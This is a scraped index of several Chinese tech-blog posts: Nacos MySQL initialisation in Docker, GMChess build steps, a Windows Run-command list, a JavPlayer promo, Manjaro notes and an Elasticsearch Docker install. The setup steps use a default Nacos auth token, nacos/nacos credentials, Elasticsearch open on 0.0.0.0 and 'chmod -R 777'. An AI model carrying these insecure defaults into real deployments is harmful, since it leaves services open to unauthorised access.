5.1、Nacos 启动失败5.1.1、原因分析容器虽然都启动成功了，但浏览器无法访问 http://127.0.0.1:8848/nacos，查看 Nacos 的日志文件，发现有 No DataSource set 相关的异常信息，也就是 Nacos Server 无法正常连接到 MySQL 数据库 1234567891011# 查看Nacos的日志文件$ tail -n 20 example/standalone-logs/nacos.logCaused by: java.lang.IllegalStateException: No DataSource set at org.springframework.util.Assert.state(Assert.java:73) at org.springframework.jdbc.support.JdbcAccessor.obtainDataSource(JdbcAccessor.java:77) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:371) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:452) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:462) at org.springframework.jdbc.core.JdbcTemplate.queryForObject(JdbcTemplate.java:473) at org.springframework.jdbc.core.JdbcTemplate.queryForObject(JdbcTemplate.java:480) 经过排查，发现可能是以下几方面原因造成： 1）开启系统防火墙导致 2）在 MySQL 的配置文件 /etc/mysql/mysql.conf.d/mysqld.cnf 里，开启了 bind 127.0.0.1 配置项，导致外部无法连接 3）在 MySQL 数据库里不存在 nacos 用户，这是因为在 env 目录下的 Docker-Compose 环境配置文件中，指定了 Nacos 默认连接 MySQL 时使用的用户名和密码为 nacos/nacos 4）在 MySQL 数据库里不存在 nacos_devtest 数据库，这是因为在 env 目录下的 Docker-Compose 环境配置文件中，指定了 Nacos 默认连接的 MySQL 数据库为 nacos_devtest 分析结果：各种假设经过逐一验证后，最终发现导致 Nacos 无法连接 MySQL 数据库的原因，是因为在 MySQL 数据库中，不存在 nacos 用户，同时也不存在 nacos_devtest 数据库，即 MySQL 数据库里没有被初始化过 5.1.2、初始化 MySQL 数据库温馨提示：以下数据库初始化操作适用于 MySQL 5.7、MySQL 8，同时适用于 Nacos 单机模式和集群模式。若使用了不同的 YAML 配置文件来管理 Nacos 的镜像和容器，此时只需要将下列命令中的 example/xxx.yaml 替换为自己所使用的 YAML 配置文件的路径即可。 拷贝数据库初始化脚本 nacos-mysql.sql 到 MySQL 容器的根目录下，并在 MySQL 容器内通过命令行登录进 MySQL 数据库 1234567891011# 启动所有容器# docker-compose -f example/standalone-mysql-5.7.yaml start# 拷贝数据库初始化脚本到MySQL容器的根目录下# docker cp nacos/distribution/conf/nacos-mysql.sql mysql:/# 连接MySQL容器# docker exec -it mysql /bin/bash# 在MySQL容器内，通过命令行登录进MySQL数据库；在终端输入"mysql"后，直接按下回车键即可，不需要指定数据库的用户名和密码，默认是以root用户登录# mysql 在 MySQL 的容器内登录进 MySQL 数据库后，执行数据库初始化操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 创建用户mysql&gt; CREATE USER \'nacos\'@\'%\' IDENTIFIED BY \'nacos\';# 创建数据库mysql&gt; create database nacos_devtest default character set utf8;# 用户授权访问# GRANT ALL ON nacos_devtest.* TO \'nacos\'@\'%\';# 刷新权限# flush privileges;# 切换数据库mysql&gt; use nacos_devtest;# 执行数据库初始化脚本mysql&gt; source /nacos-mysql.sql;# 查看数据库表mysql&gt; show tables;+------------------------+| Tables_in_nacos_devtest |+------------------------+| config_info || config_info_aggr || config_info_beta || config_info_tag || config_tags_relation || group_capacity || his_config_info || permissions || roles || tenant_capacity || tenant_info || users |+------------------------+12 rows in set (0.00 sec)# 退出登录MySQLmysql&gt; exit# 断开MySQL容器的连接# exit# 重启所有容器# docker-compose -f example/standalone-mysql-5.7.yaml restart 容器重启后，若在 Nacos 的日志文件里观察到以下内容，则说明 Nacos 可以正常启动 12345678910111213# tail -n 20 example/standalone-logs/nacos.log2020-03-12 23:01:50,062 INFO Initializing ExecutorService \'taskScheduler\'2020-03-12 23:01:50,092 INFO Exposing 16 endpoint(s) beneath base path \'/actuator\'2020-03-12 23:01:50,240 INFO Tomcat started on port(s): 8848 (http) with context path \'/nacos\'2020-03-12 23:01:50,245 INFO Started Nacos in 12.964 seconds (JVM running for 13.92)2020-03-12 23:01:50,246 INFO Nacos Log files: /home/nacos/logs2020-03-12 23:01:50,247 INFO Nacos Log files: /home/nacos/conf2020-03-12 23:01:50,247 INFO Nacos Log files: /home/nacos/data2020-03-12 23:01:50,248 INFO Nacos started successfully in stand alone mode. use external storage2020-03-12 23:01:55,147 INFO Initializing Spring DispatcherServlet \'dispatcherServlet\'2020-03-12 23:01:55,147 INFO Initializing Servlet \'dispatcherServlet\'2020-03-12 23:01:55,169 INFO Completed initialization in 22 ms Docker 属性配置列表 属性名称 描述 选项 MODE 系统启动方式：集群 / 单机 cluster/standalone 默认 cluster NACOS_SERVERS 集群地址 p1:port1 空格 ip2:port2 空格 ip3:port3 PREFER_HOST_MODE 支持 IP 还是域名模式 hostname/ip 默认 ip NACOS_SERVER_PORT Nacos 运行端口 默认 8848 NACOS_SERVER_IP 多网卡模式下可以指定 IP SPRING_DATASOURCE_PLATFORM 单机模式下支持 MYSQL 数据库 mysql / 空 默认：空 MYSQL_SERVICE_HOST 数据库连接地址 MYSQL_SERVICE_PORT 数据库端口 默认 : 3306 MYSQL_SERVICE_DB_NAME 数据库库名 MYSQL_SERVICE_USER 数据库用户名 MYSQL_SERVICE_PASSWORD 数据库用户密码 MYSQL_SERVICE_DB_PARAM 数据库连接参数 default : characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true MYSQL_DATABASE_NUM It indicates the number of database 默认 :1 JVM_XMS -Xms 默认 :2g JVM_XMX -Xmx 默认 :2g JVM_XMN -Xmn 默认 :1g JVM_MS -XX:MetaspaceSize 默认 :128m JVM_MMS -XX:MaxMetaspaceSize 默认 :320m NACOS_DEBUG 是否开启远程 DEBUG y/n 默认 :n TOMCAT_ACCESSLOG_ENABLED server.tomcat.accesslog.enabled 默认 :false NACOS_AUTH_SYSTEM_TYPE 权限系统类型选择，目前只支持 nacos 类型 默认 :nacos NACOS_AUTH_ENABLE 是否开启权限系统 默认 :false NACOS_AUTH_TOKEN_EXPIRE_SECONDS token 失效时间 默认 :18000 NACOS_AUTH_TOKEN token 默认 :SecretKey012345678901234567890123456789012345678901234567890123456789 NACOS_AUTH_CACHE_ENABLE 权限缓存开关，开启后权限缓存的更新默认有 15 秒的延迟 默认 : false MEMBER_LIST 通过环境变量的方式设置集群地址 例子：192.168.16.101:8847?raft_port=8807,192.168.16.101?raft_port=8808,192.168.16.101:8849?raft_port=8809 EMBEDDED_STORAGE 是否开启集群嵌入式存储模式 embedded 默认 : none 参考资料 Nacos 监控指南 Nacos Docker 项目 Nacos Docker 移除主从镜像配置 Nacos Docker 快速开始（属性配置的内容已过时） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"中国象棋之三 Linux 下的象棋软件 GMChess",url:"/posts/e44e61ed.html",text:'大纲 中国象棋之一开源 AI 引擎介绍 中国象棋之二 ElephantEye 引擎深入理解 中国象棋之三 Linux 下的象棋软件 GMChess GMChess 介绍GMChess（天书棋谈） 是一款由 Lerosua 编写的 Linux 下开源的中国象棋程序，基于 gtkmm 和 C++ 完成，使用了象棋巫师（xqwizard）开源的 ElephantEye（象眼）作为象棋引擎。支持人机对战和人人对战，但是最初只能在同一台机子上进行人人对战，这显然很不方便。于是 Lerosua 又给 GMChess 开发了 pidgin 网络对战插件，支持和好友在线下象棋。注：本文适用于 Centos/Debian/Ubuntu 等 Linux 发行版 GMChess 版本历史 版本 日期 说明 0.10 2009 年 3 月 26 日 仅有读谱功能，读取 qq 象棋、联众象棋、中游象棋、象棋演播室等软件生成的棋谱 0.10.2 2009 年 4 月 12 日 添加棋谱书管理功能 0.20 2009 年 4 月 27 日 添加 AI 对战功能 0.20.1 2009 年 7 月 20 日 gmchess 图标投票，图标及声音文件都替换成 GPL 版权的文件；yalong 的补丁；初步的计时器功能 0.20.2 2009 年 8 月 20 日 更新有版权争议的图片；去除 libglademm 依赖，争取并进入 Debian 0.20.3 2009 年 10 月 9 日 配置目录更改符合 FreeDesktop.org 标准，添加难度设置，改进界面，支持使用黑棋 0.29.3 2010 年 11 月 19 日 未知 0.29.4 2011 年 10 月 15 日 未知 0.29.5 2011 年 12 月 26 日 未知 0.29.6 2011 年 12 月 28 日 未知 GMChess 源码下载GMChess 最新的源码可以在这里（自备梯子）下载，注意 gmchess-0.29.6.tar.bz2 和 pidgin-gmchess-0.02.tar.gz 都要下载编译安装。为了方便没有梯子的网友，提供本站的下载地址： gmchess-0.29.6.tar.bz2 pidgin-gmchess-0.02.tar.gz GMChess 编译安装Centos 系统环境下，编译 GMChess 时可能会因 gcc、g++ 版本对代码存在兼容问题，导致编译失败；至于其他 Linux 发行版的编译安装步骤，可参考下述内容： 1234567891011121314# 在centos系统安装gtkmm24# yum install gtkmm24-devel# 解压源码# tar -xvf gmchess-0.29.6.tar.bz2# 进入解压目录# cd gmchess-0.29.6# 指定安装路径./configure --prefix=/usr/local# 编译安装# make &amp;&amp; make install GMChess Pidgin 插件编译安装1234567891011121314151617181920# 在centos系统安装pidgin（互联网通讯程序）# yum install pidgin pidgin-devel# 创建存放pidgin插件的目录# mkdir -p /usr/lib/pidgin# 解压源码# tar -xvf pidgin-gmchess-0.02.tar.gz# 进入解压目录# cd pidgin-gmchess-0.02# 编译安装# make &amp;&amp; make install# 拷贝Gmchess的插件文件到当前用户的主目录（区分不同的Linux用户）$ mkdir -p ~/.purple/plugins/$ cp gmchess-network.so ~/.purple/plugins/# 最后菜单栏导航到：应用程序 --&gt; 互联网 --&gt; Pidgin（互联网通讯程序）--&gt; 工具 --&gt; 插件 --&gt; 勾选上Pidgin的Gmchess插件，如下图所示 Pidgin 对弈聊天窗口当 GMChess 的 Pidgin 插件安装好后，在 Pidgin 的好友对话框内可看见工具栏右边多了一个 “帅” 字的按钮（如下图）。点击 “帅” 字按钮，发起下棋的邀请后就可以等对方回应了。当对方收到请求，按 yes 则会自动调用 GMChess 开始棋局，按 no 则拒绝应战。同意应战后需要等待一会，GMChess 会自动打开，发起请求的一方会自动成为红方，此时就可以开始对弈了。 参考资料 GMchess 棋力变差 GMChess 中国象棋软件菜单汉化补丁包 中国象棋 Gmchess 的 MQF 棋谱及棋子 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"CMD 命令大全",url:"/posts/49651ebe.html",text:'1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071. appwiz.cpl：程序和功能 2. calc：启动计算器 5. chkdsk.exe：磁盘检查6. cleanmgr: 打开磁盘清理工具 9. cmd.exe：CMD命令提示符 10. 自动关机命令 Shutdown -s -t 600：表示600秒后自动关机 shutdown -a ：可取消定时关机 Shutdown -r -t 600：表示600秒后自动重启 12. CompMgmtLauncher：计算机管理 13. compmgmt.msc：计算机管理 14. credwiz：备份或还原储存的用户名和密码 16. control：控制面版 17. dcomcnfg：打开系统组件服务 19. devmgmt.msc：设备管理器 20. desk.cpl：屏幕分辨率 21. dfrgui：优化驱动器22. dialer：电话拨号程序 23. diskmgmt.msc：磁盘管理 24. dvdplay：DVD播放器 25. dxdiag：检查DirectX信息 26. eudcedit：造字程序 27. eventvwr：事件查看器 28. explorer：打开资源管理器 29. Firewall.cpl：Windows防火墙 31. fsmgmt.msc：共享文件夹管理器 32. gpedit.msc：组策略 33. hdwwiz.cpl：设备管理器 34. inetcpl.cpl：Internet属性 35. intl.cpl：区域 36. iexpress：木马捆绑工具37. joy.cpl：游戏控制器 38. logoff：注销命令 39. lusrmgr.msc：本地用户和组 40. lpksetup：语言包安装/删除向导41. lusrmgr.msc：本机用户和组 42. main.cpl：鼠标属性 43. mmsys.cpl：声音 45. mem.exe：显示内存使用情况47. mmc：打开控制台 48. mobsync：同步命令 50. msconfig.exe：系统配置实用程序 51. msdt：微软支持诊断工具 52. msinfo32：系统信息 53. mspaint：画图 54. Msra：Windows远程协助 55. mstsc：远程桌面连接 56. NAPCLCFG.MSC：客户端配置 57. ncpa.cpl：网络连接 58. narrator：屏幕“讲述人” 59. Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项 60. netstat : an(TC)命令检查接口 61. notepad：打开记事本 62. Nslookup：IP地址侦测器 63. odbcad32：ODBC数据源管理器 64. OptionalFeatures：打开“打开或关闭Windows功能”对话框 65. osk：打开屏幕键盘 66. perfmon.msc：计算机性能监测器 67. perfmon：计算机性能监测器 68. PowerShell：提供强大远程处理能力 69. printmanagement.msc：打印管理 70. powercfg.cpl：电源选项 71. psr：问题步骤记录器 72. Rasphone：网络连接 73. Recdisc：创建系统修复光盘 74. Resmon：资源监视器 75. Rstrui：系统还原 76. regedit.exe：注册表 77. regedt32：注册表编辑器 78. rsop.msc：组策略结果集 79. sdclt：备份状态与配置，就是查看系统是否已备份 80. secpol.msc：本地安全策略 81. services.msc：本地服务设置 82. sfc /scannow：扫描错误并复原/windows文件保护 83. sfc.exe：系统文件检查器 84. shrpubw：创建共享文件夹 85. sigverif：文件签名验证程序 86. slui：Windows激活，查看系统激活信息 87. slmgr.vbs -dlv ：显示详细的许可证信息 slmgr.vbs -dli ：显示许可证信息 slmgr.vbs -xpr ：当前许可证截止日期 slmgr.vbs -dti ：显示安装ID 以进行脱机激 slmgr.vbs -ipk ：(Product Key)安装产品密钥 slmgr.vbs -ato ：激活Windows slmgr.vbs -cpky ：从注册表中清除产品密钥（防止泄露引起的攻击） slmgr.vbs -ilc ：(License file)安装许可证 slmgr.vbs -upk ：卸载产品密钥 slmgr.vbs -skms ：(name[ort] )批量授权 88. snippingtool：截图工具，支持无规则截图 89. soundrecorder：录音机，没有录音时间的限制 90. StikyNot：便笺 91. sysdm.cpl：系统属性 92. sysedit：系统配置编辑器 93. syskey：系统加密，一旦加密就不能解开，保护系统的双重密码 94. taskmgr：任务管理器（旧版） 96. taskschd.msc：任务计划程序 97. timedate.cpl：日期和时间 99. utilman：辅助工具管理器 100. wf.msc：高级安全Windows防火墙 101. WFS：Windows传真和扫描 102. wiaacmgr：扫描仪和照相机向导 103. winver：关于Windows 104. wmimgmt.msc：打开windows管理体系结构(WMI) 105. write：写字板106. wscui.cpl：操作中心 107. wscript：windows脚本宿主设置 108. wuapp：Windows更新 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991. gpedit.msc：组策略2. sndrec32：录音机3. Nslookup：IP地址侦测器4. explorer：打开资源管理器 5. logoff：注销命令6. shutdown：60秒倒计时关机命令7. lusrmgr.msc：本机用户和组8. services.msc：本地服务设置9. oobe/msoobe /a：检查XP是否激活10. notepad：打开记事本 11. cleanmgr：垃圾整理12. net start messenger：开始信使服务13. compmgmt.msc：计算机管理14. net stop messenger：停止信使服务15. conf：启动netmeeting16. dvdplay：DVD播放器17. charmap：启动字符映射表18. diskmgmt.msc：磁盘管理实用程序19. calc：启动计算器20. dfrg.msc：磁盘碎片整理程序21. chkdsk.exe：Chkdsk磁盘检查22. devmgmt.msc：设备管理器 24. drwtsn32：系统医生25. rononce -p：15秒关机26. dxdiag：检查DirectX信息27. regedt32：注册表编辑器 29. rsop.msc：组策略结果集30. mem.exe：显示内存使用情况31. regedit.exe：注册表32. winchat：XP自带局域网聊天33. progman：程序管理器34. winmsd：系统信息35. perfmon.msc：计算机性能监测程序36. winver：检查Windows版本37. sfc /scannow：扫描错误并复原38. taskmgr：任务管理器39. winver：检查Windows版本40. wmimgmt.msc：打开windows管理体系结构(WMI)41. wupdmgr：windows更新程序42. wscript：windows脚本宿主设置43. write：写字板44. winmsd：系统信息45. wiaacmgr：扫描仪和照相机向导46. winchat：XP自带局域网聊天47. mem.exe：显示内存使用情况48. msconfig.exe：系统配置实用程序49. mplayer2：简易widnows media player50. mspaint：画图板51. mstsc：远程桌面连接52. mplayer2：媒体播放机53. magnify：放大镜实用程序54. mmc：打开控制台55. mobsync：同步命令56. dxdiag：检查DirectX信息57. iexpress：木马捆绑工具58. fsmgmt.msc：共享文件夹管理器59. utilman：辅助工具管理器60. diskmgmt.msc：磁盘管理实用程序61. dcomcnfg：打开系统组件服务62. ddeshare：打开DDE共享设置110. osk：打开屏幕键盘 111. odbcad32：ODBC数据源管理器112. oobe/msoobe /a：检查XP是否激活114. logoff：注销命令66. notepad：打开记事本67. nslookup：网络管理的工具向导68. ntbackup：系统备份和还原69. narrator：屏幕“讲述人”70. ntmsmgr.msc：移动存储管理器71. ntmsoprq.msc：移动存储管理员操作请求72. netstat -an：(TC)命令检查接口73. syncapp：创建一个公文包74. sysedit：系统配置编辑器75. sigverif：文件签名验证程序76. ciadv.msc：索引服务程序77. shrpubw：创建共享文件夹78. secpol.msc：本地安全策略79. syskey：系统加密，一旦加密就不能解开，保护windows xp系统的双重密码80. services.msc：本地服务设置81. Sndvol32：音量控制程序82. sfc.exe：系统文件检查器83. sfc /scannow：windows文件保护84. ciadv.msc：索引服务程序85. tourstart：xp简介（安装完成后出现的漫游xp程序）86. taskmgr：任务管理器87. eventvwr：事件查看器88. eudcedit：造字程序89. compmgmt.msc：计算机管理90. packager：对象包装程序91. perfmon.msc：计算机性能监测程序92. charmap：启动字符映射表93. cliconfg：SQL SERVER 客户端网络实用程序94. Clipbrd：剪贴板查看器95. conf：启动netmeeting96. certmgr.msc：证书管理实用程序97. regsvr32 /u *.dll：停止dll文件运行98. regsvr32 /u zipfldr.dll：取消ZIP支持99. cmd.exe：CMD命令提示符100. chkdsk.exe：磁盘检查 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"windows系统"},{title:"Windows 装机软件推荐",url:"/posts/697a4777.html",text:'磁盘磁盘分区 迷你兔（MiniTool）分区向导 系统备份 迷你兔（MiniTool）数据备份大师 数据恢复 迷你兔（MiniTool）数据恢复软件 FTPFTP 服务器 FileZilla Server FTP 客户端 FileZilla Client var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"windows系统"},{title:"一款去马赛克的视频播放器 JavPlayer",url:"/posts/1f1f7d32.html",text:'相关站点 JavPlayer 官网 限时免费试用完整版下载 产品概述 JavPlayer 是一款视频播放器（收费），可以减少马赛克而不会丢失细节，让沉睡在硬盘里的视频变成宝藏。JavPlayer 使用了 TecoGAN，TecoGAN 是一种使用深度学习的视频超分辨率算法，接管部分处理的记录模式正在测试中。特别说明，请尊重原视频创作者的版权，请勿滥用并非法传播经处理后的视频，由此产生的后果及一切法律责任自负，相关责任一概与本站无关。 操作简便 可以通过拖放视频文件来播放它 如果是在 2012~2016 年发布高质量视频，则会感受到默认设置的马赛克缩小效果 如果在设置面板中进行了轻微调整，则会扩展可支持的视频宽度 可以通过一个按钮捕获需要专用播放器的视频 先进的技术 分析图像并自动确定马赛克的面积和粗糙度 根据马赛克的粗糙度（单元尺寸）进行适当的处​​理 即使不是高性能 PC，也可以在播放全高清视频时实时处理 不仅使用简单的模糊，而且使用了诸如超分辨率滤波器的方法 各种功能 每部电影的设置将自动保存并在下次播放时加载 具有一般功能，例如逐帧，跳过，范围选择循环，固定宽高比和颜色校正 如果为每个场景设置马赛克缩小处理，则可以在整个长片中获得足够的效果，仅限产品版本 如果录制已处理的视频，则可在移动设备上使用 推荐的运行环境 安装 DirectX11 CPU：i3 或更高 GPU：GeForceGT710 或更高版本（或等效的内置 GPU），推荐用于 VR MainXemory 的 GTX750 或更高版本：4G 或更高 操作系统：Windows8、Windows10（32 位，64 位），Windows7 上无法使用捕获和录制 TecoGAN 需要兼容 AVX 的 CPU（SandyBridge 或更高版本，i3 或更高版本）和 64 位 Windows TrialVersion 的限制 录制创建的视频宽度固定为 640 像素，可在产品版本中指定 即使指定了范围，录制也将在 1 分钟后结束，产品版本无限制 处理设置适用于整个视频，可以为每个部分单独设置产品版本 VR 模式下的马赛克减少最多 10 分钟，如果超出则继续没有马赛克减少 其他说明 如果背景是网格图案，则可以处理整个屏幕 如果视频质量太低，则无法检测到马赛克，并且不会显示效果 无法播放受 DRM 保护的视频，但可以使用实时捕获来处理它们 它支持 mp4、wmv、mkv、avi、jpg、png，但有些视频由于编解码器而无法播放 产品缺点 无法恢复预镶嵌状态 存在图像质量低的旧视频或具有特殊马赛克处理的视频的不良情况 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"Manjaro 入坑前的碎碎念",url:"/posts/3d242d5c.html",text:'CentOS 使用体验 使用 Linux 系统已经很多年了，CentOS/Debian/Ubuntu 都有接触过，其中 CentOS 使用的时间最长了，从 CentOS6 到 CentOS7 陆陆续续用了有六七年。抛开其他方面不说，Debian/Ubuntu 都是很优秀的 Linux 发行版，由于这么多年来公司的服务器都是标配 CentOS，因此当初为了踩更多的坑，就一直坚持使用 CentOS。当年的目标很单纯也很纯粹，为的就是希望在企业的生产环境更能得心应手。CentOS 继承了 RedHat 的血统，无论是作为企业服务器还是日常使用的开发机，都能胜任大多数使用场景了。唯一需要吐槽的可能就是内核版本很低、软件版本比较旧、软件资源少，但正是这样才凸显了 CentOS 的稳定性，毕竟对企业服务器来说，稳定性压倒一切。如果希望得到像 Arch、Deppin、Elementary OS 那样拥有炫酷界面、丰富的软件、滚动更新等特性，那么 CentOS 确实不适合这类用户。CentOS 默认使用 GNOME 作为桌面环境，而 GNOME Shell 的社区拥有大量开源插件，因此花点时间也可以将 CentOS 折腾得比较满意。例如经过显卡驱动优化、GNOME 桌面美化、输入法更换、壁纸更换、配置 Zsh、Guake 后，可以达到比较满意的界面体验，而 CentOS 桌面软件少的问题，也可以通过 Snap、Flatpak 间接得到缓解。 放弃 CentOS 的原因 由于笔者在 2019 年 9 月初更换了一款超宽屏的显示器，同时也升级了显卡，硬件升级之后想当然地希望获得更好的使用体验。当时已经开始不满足于 CentOS 的现状了，于是心中萌发了转投 Manjaro 的想法，但原 CentOS 系统里已经搭建了日常使用的开发环境（包括各种编程环境、IDE、工具链等），对于懒癌晚期的笔者来说，更换系统意味着重新搭建开发环境，因此更换系统的事情就被搁置了。刚好 CentOS 官方在 2019 年 10 月发布了 CentOS8 和 CentOS Streams，加入了大量的新特性，是一款非常值得期待的 Linux 系统。遗憾的是 CentOS 官方向来不支持大版本更新，也就是无法从 CentOS7 直接更新到 CentOS8。如果非得使用 CentOS8 的话，此时只能重新全盘安装，而全盘安装也意味着以前的开发环境还是要重新搭建。试想一下，要是多年以后 CentOS9 发布了，岂不是又要重新安装嘛。考虑到硬件升级 + Centos8 系统发布带来的契机，转投 Manjaro 的转折点终于到了，但是笔者并不是以后都不使用 CentOS，只是在自己的开发机上不再安装 CentOS，日后的工作中依然是离不开 CentOS 系统。 转投 Manjaro 的原因 Manjaro 解决了笔者最重要的两个痛点，一是支持稳定的滚动更新，二是社区拥有大量的软件（AUR、Snap、Flatpak），而且官方默认提供了三款（XFCE、KDE、GNOME）优秀的桌面环境，社区也有提供多款非常优秀的桌面环境（MATE、Bspwm、Budgie、Cinnamon、Deepin）。 Manjaro 的优点 WiKi 非常完善 丰富的桌面环境 稳定的滚动更新 可定制化程度高 AUR，软件资源丰富 硬件设定及内核管理支持 未完待续 先写到这里，等更换了 Manjaro 再唠叨，毕竟安装新的系统后，还需要一段较长的磨合时间才能用得爽，不过拖延症蛮严重的，也不知道哪天才能真的转投 Manjaro 。。。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"manjaro"},{title:"Docker 安装 ElasticSearch (单机)",url:"/posts/8a293d1c.html",text:'前言本文主要介绍 Docker 如何安装单机版的 ElasticSearch 服务。 版本说明 软件 版本 描述 Docker 20.10.21 ElasticSearch 7.4.2 DockerHub 镜像地址 Kibana 7.4.2 DockerHub 镜像地址 ElasticSearch 安装拉取 Docker 镜像1# docker pull elasticsearch:7.4.2 创建配置文件和目录创建配置目录12345678# 创建配置目录# mkdir -p /etc/elasticsearch/config# 创建数据目录# mkdir -p /etc/elasticsearch/data# 创建插件目录# mkdir -p /etc/elasticsearch/plugins 创建配置文件 jvm.options 12345678# 创建JVM的配置文件# touch /etc/elasticsearch/config/jvm.options# 添加JVM的配置参数# vim /etc/elasticsearch/config/jvm.options-Xms128m-Xmx512m-Dlog4j2.disable.jmx=true 参数说明 -Dlog4j2.disable.jmx=true：设置禁用 Log4j2 的 JMX 功能。 -Xms128m：设置 JVM 初始分配的堆内存大小，生产环境可以设置大一点。 -Xmx512m：设置 JVM 最大允许分配的堆内存大小，生产环境可以设置大一点。 log4j2.properties 12# 创建Log4j2的配置文件# touch /etc/elasticsearch/config/log4j2.properties elasticsearch.yml 123456# 创建ES的配置文件# touch /etc/elasticsearch/config/elasticsearch.yml# 添加ES的配置参数（冒号后面必须有一个空格）# vim /etc/elasticsearch/config/elasticsearch.ymlhttp.host: 0.0.0.0 配置文件授权1# chmod -R 777 /etc/elasticsearch ElasticSearch 运行Docker 运行容器123456789# docker run \\ --restart=always \\ --name elasticsearch \\ -p 9200:9200 -p 9300:9300 \\ -e "discovery.type=single-node" \\ -v /etc/elasticsearch/data:/usr/share/elasticsearch/data \\ -v /etc/elasticsearch/config:/usr/share/elasticsearch/config \\ -v /etc/elasticsearch/plugins:/usr/share/elasticsearch/plugins \\ -d elasticsearch:7.4.2 参数说明 -e "discovery.type=single-node"：设置 Elasticsearch 以单节点运行。 -p 9200:9200 -p 9300:9300：设置 Elasticsearch 的监听端口，9200 是 HTTP 端口，9300 是集群通信的端口。 Docker-Compose 运行容器12345678910111213141516version: "3.5"services: elasticsearch: image: elasticsearch:7.4.2 container_name: elasticsearch restart: always ports: - 9200:9200 - 9300:9300 environment: - discovery.type=single-node volumes: - \'/etc/elasticsearch/data:/usr/share/elasticsearch/data\' - \'/etc/elasticsearch/config:/usr/share/elasticsearch/config\' - \'/etc/elasticsearch/plugins:/usr/share/elasticsearch/plugins\' 查看 Docker 容器是否正常运行浏览器访问 http://192.168.1.103:9200，若响应得到以下的 JSON 数据，则说明 Elasticsearch 容器正常运行。值得一提的是，192.168.1.103 是 Elasticsearch 容器的 IP 地址，9200 是 Elasticsearch 监听的 HTTP 端口。 1234567891011121314151617{ "name" : "8b8d235ad522", "cluster_name" : "elasticsearch", "cluster_uuid" : "RMg_ymJAQCu_eTcBzI9LKg", "version" : { "number" : "7.4.2", "build_flavor" : "default", "build_type" : "docker", 